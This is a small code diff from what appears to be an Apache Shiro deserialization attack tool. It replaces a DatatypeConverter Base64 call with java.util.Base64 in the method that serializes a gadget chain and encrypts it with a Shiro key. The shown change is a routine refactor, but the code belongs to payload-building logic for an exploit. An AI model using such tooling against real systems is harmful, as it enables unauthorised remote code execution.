@@ -10,8 +10,8 @@ import com.summersec.attack.deser.util.GadgetsK;
 import com.summersec.attack.utils.AesUtil;
 import com.mchange.v2.ser.SerializableUtils;
 import java.util.Arrays;
+import java.util.Base64;
 import java.util.List;
-import javax.xml.bind.DatatypeConverter;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.crypto.CipherService;
 import org.apache.shiro.util.ByteSource;
@@ -30,7 +30,7 @@ public class Shiro implements FramePayload {
     @Override
     public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
         byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
+        byte[] bkey = Base64.getDecoder().decode(key);
         byte[] encryptpayload = null;
 //        byte[] encryptpayload;
         if (AttackService.aesGcmCipherType == 1) {
@@ -61,7 +61,7 @@ public class Shiro implements FramePayload {
 //    @Override
 //    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
 //        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-//        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
+//        byte[] bkey = Base64.getDecoder().decode(key);
 //        byte[] encryptpayload = null;
 //    //        byte[] encryptpayload;
 //        if (AttackService.aesGcmCipherType == 1) {
